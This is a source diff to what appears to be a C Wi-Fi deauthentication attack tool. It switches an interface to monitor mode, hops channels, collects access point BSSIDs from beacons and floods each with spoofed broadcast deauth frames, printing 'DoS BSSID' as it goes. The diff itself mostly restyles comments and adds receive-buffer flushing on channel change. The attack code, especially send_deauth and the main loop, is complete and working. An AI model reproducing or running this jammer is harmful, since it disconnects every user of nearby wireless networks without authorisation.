@@ -52,42 +52,42 @@ int iw_open(struct dev *dev) {
 		return_error("socket");
 	dev->fd = fd;
 
-	// save current interface flags
+	/* save current interface flags */
 	memset(&dev->old_flags, 0, sizeof(dev->old_flags));
 	strncpy(dev->old_flags.ifr_name, dev->ifname, sizeof(dev->old_flags.ifr_name)-1);
 	if (ioctl(fd, SIOCGIFFLAGS, &dev->old_flags) < 0)
 		return_error("ioctl(SIOCGIFFLAGS)");
 
-	// save current interface mode
+	/* save current interface mode */
 	memset(&dev->old_mode, 0, sizeof(dev->old_mode));
 	strncpy(dev->old_mode.ifr_name, dev->ifname, sizeof(dev->old_mode.ifr_name)-1);
 	if (ioctl(fd, SIOCGIWMODE, &dev->old_mode) < 0)
 		return_error("ioctl(SIOCGIWMODE)");
 
-	// set interface down (ifr_flags = 0)
+	/* set interface down (ifr_flags = 0) */
 	memset(&ifr, 0, sizeof(ifr));
 	strncpy(ifr.ifr_name, dev->ifname, sizeof(ifr.ifr_name)-1);
 	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
 		return_error("ioctl(SIOCSIFFLAGS)");
 
-	// set monitor mode
+	/* set monitor mode */
 	memset(&iwr, 0, sizeof(iwr));
 	strncpy(iwr.ifr_name, dev->ifname, sizeof(iwr.ifr_name)-1);
 	iwr.u.mode = IW_MODE_MONITOR;
 	if (ioctl(fd, SIOCSIWMODE, &iwr) < 0)
 		return_error("ioctl(SIOCSIWMODE)");
 
-	// set interface up, broadcast and running
+	/* set interface up, broadcast and running */
 	ifr.ifr_flags = IFF_UP | IFF_BROADCAST | IFF_RUNNING;
 	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
 		return_error("ioctl(SIOCSIFFLAGS)");
 
-	// get interface index
+	/* get interface index */
 	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
 		return_error("ioctl(SIOCGIFINDEX)");
 	dev->ifindex = ifr.ifr_ifindex;
 
-	// bind interface to socket
+	/* bind interface to socket */
 	memset(&sll, 0, sizeof(sll));
 	sll.sll_family = AF_PACKET;
 	sll.sll_ifindex = dev->ifindex;
@@ -95,7 +95,7 @@ int iw_open(struct dev *dev) {
 	if (bind(fd, (struct sockaddr*)&sll, sizeof(sll)) < 0)
 		return_error("bind(%s)", dev->ifname);
 
-	// enable promiscuous mode
+	/* enable promiscuous mode */
 	memset(&mreq, 0, sizeof(mreq));
 	mreq.mr_ifindex = dev->ifindex;
 	mreq.mr_type = PACKET_MR_PROMISC;
@@ -111,13 +111,13 @@ void iw_close(struct dev *dev) {
 	if (dev->fd == -1)
 		return;
 
-	// set interface down (ifr_flags = 0)
+	/* set interface down (ifr_flags = 0) */
 	memset(&ifr, 0, sizeof(ifr));
 	strncpy(ifr.ifr_name, dev->ifname, sizeof(ifr.ifr_name)-1);
 	ioctl(dev->fd, SIOCSIFFLAGS, &ifr);
-	// restore old mode
+	/* restore old mode */
 	ioctl(dev->fd, SIOCSIWMODE, &dev->old_mode);
-	// restore old flags
+	/* restore old flags */
 	ioctl(dev->fd, SIOCSIFFLAGS, &dev->old_flags);
 	close(dev->fd);
 }
@@ -136,15 +136,15 @@ ssize_t iw_write(int fd, void *buf, size_t count) {
 	w_rt_data = (struct write_radiotap_data*)(pbuf + sizeof(*rt_hdr));
 	pkt = pbuf + sizeof(*rt_hdr) + sizeof(*w_rt_data);
 
-	// radiotap header
+	/* radiotap header */
 	memset(rt_hdr, 0, sizeof(*rt_hdr));
 	rt_hdr->len = sizeof(*rt_hdr) + sizeof(*w_rt_data);
 	rt_hdr->present = RADIOTAP_F_PRESENT_RATE | RADIOTAP_F_PRESENT_TX_FLAGS;
-	// radiotap fields
+	/* radiotap fields */
 	memset(w_rt_data, 0, sizeof(*w_rt_data));
-	w_rt_data->rate = 2; // 1 Mb/s
+	w_rt_data->rate = 2; /* 1 Mb/s */
 	w_rt_data->tx_flags = RADIOTAP_F_TX_FLAGS_NOACK | RADIOTAP_F_TX_FLAGS_NOSEQ;
-	// packet
+	/* packet */
 	memcpy(pkt, buf, count);
 
 	r = send(fd, pbuf, rt_hdr->len + count, 0);
@@ -161,7 +161,7 @@ ssize_t iw_read(int fd, void *buf, size_t count, uint8_t **pkt, size_t *pkt_sz) 
 	struct radiotap_hdr *rt_hdr;
 	int r;
 
-	// read packet
+	/* read packet */
 	r = recv(fd, buf, count, 0);
 	if (r < 0)
 		return_error("recv");
@@ -178,16 +178,32 @@ ssize_t iw_read(int fd, void *buf, size_t count, uint8_t **pkt, size_t *pkt_sz) 
 
 int iw_set_channel(struct dev *dev, int chan) {
 	struct iwreq iwr;
+	int rcvbuflen, old_rcvbuflen;
+	socklen_t optlen;
 
+	/* get receive buffer size */
+	optlen = sizeof(old_rcvbuflen);
+	if (getsockopt(dev->fd, SOL_SOCKET, SO_RCVBUF, &old_rcvbuflen, &optlen) < 0)
+		return_error("getsockopt(SO_RCVBUF)");
+
+	/* set receive buffer size to 0 */
+	/* this will discard packets that are in kernel packet queue */
+	rcvbuflen = 0;
+	if (setsockopt(dev->fd, SOL_SOCKET, SO_RCVBUF, &rcvbuflen, optlen) < 0)
+		return_error("setsockopt(SO_RCVBUF)");
+
+	/* set channel */
 	memset(&iwr, 0, sizeof(iwr));
 	strncpy(iwr.ifr_name, dev->ifname, sizeof(iwr.ifr_name)-1);
 	iwr.u.freq.flags = IW_FREQ_FIXED;
 	iwr.u.freq.m = chan;
-
 	if (ioctl(dev->fd, SIOCSIWFREQ, &iwr) < 0)
 		return_error("ioctl(SIOCSIWFREQ)");
-
 	dev->chan = chan;
+
+	/* restore the default buffer size */
+	if (setsockopt(dev->fd, SOL_SOCKET, SO_RCVBUF, &old_rcvbuflen, optlen) < 0)
+		return_error("setsockopt(SO_RCVBUF)");
 
 	return 0;
 }
@@ -203,15 +219,15 @@ int send_deauth(int fd, unsigned char *ap_mac) {
 
 	memset(deauth, 0, sizeof(deauth));
 	deauth->fc.subtype = FRAME_CONTROL_SUBTYPE_DEAUTH;
-	// broadcast mac (ff:ff:ff:ff:ff:ff)
+	/* broadcast mac (ff:ff:ff:ff:ff:ff) */
 	memset(deauth->dest_mac, '\xff', IFHWADDRLEN);
 	memcpy(deauth->src_mac, ap_mac, IFHWADDRLEN);
 	memcpy(deauth->bssid, ap_mac, IFHWADDRLEN);
 	reason = (uint16_t*)&deauth->frame_body;
-	// reason 7: Class 3 frame received from nonassociated STA
+	/* reason 7: Class 3 frame received from nonassociated STA */
 	*reason = htons(7);
 
-	// flood the network
+	/* flood the network */
 	for (i=0; i<128; i++) {
 		deauth->sc.sequence = i;
 		if (iw_write(fd, deauth, sizeof(*deauth) + sizeof(*reason)) < 0) {
@@ -240,7 +256,7 @@ int read_bssid(int fd, uint8_t *bssid) {
 
 	beacon = (struct mgmt_frame*)pkt;
 
-	// if beacon packet
+	/* if it's a beacon packet */
 	if (beacon->fc.subtype == FRAME_CONTROL_SUBTYPE_BEACON) {
 		memcpy(bssid, beacon->bssid, IFHWADDRLEN);
 		return 0;
@@ -277,7 +293,7 @@ int main(int argc, char *argv[]) {
 	}
 
 
-	// init signals
+	/* init signals */
 	sigemptyset(&exit_sig);
 	sigaddset(&exit_sig, SIGINT);
 	sigaddset(&exit_sig, SIGTERM);
@@ -297,7 +313,7 @@ int main(int argc, char *argv[]) {
 	pfd[0].revents = 0;
 	pfd[0].events = POLLIN;
 
-
+	/* init device */
 	init_dev(&dev);
 	strncpy(dev.ifname, argv[1], sizeof(dev.ifname)-1);
 
@@ -325,17 +341,17 @@ int main(int argc, char *argv[]) {
 			goto _errout;
 		}
 
-		if (pfd[0].revents & POLLIN) // got SIGTERM or SIGINT
+		if (pfd[0].revents & POLLIN) /* got SIGTERM or SIGINT */
 			break;
 
 		if (pfd[1].revents & POLLIN) {
 			ret = read_bssid(dev.fd, bssid);
-			if (ret == -EAGAIN)
+			if (ret == -EAGAIN) /* no bssid */
 				continue;
-			else if (ret < 0) { // error
+			else if (ret < 0) { /* error */
 				print_error();
 				goto _errout;
-			} else { // got BSSID
+			} else { /* got BSSID */
 				printf("DoS BSSID ");
 				print_mac(bssid);
 				printf("\n");
@@ -346,7 +362,8 @@ int main(int argc, char *argv[]) {
 			}
 		}
 
-		if (time(NULL) - tm1 >= 3) { // change channel every 3 seconds
+		/* change channel every 3 seconds */
+		if (time(NULL) - tm1 >= 3) {
 			chan = (chan % 13) + 1;
 			if (iw_set_channel(&dev, chan) < 0) {
 				print_error();
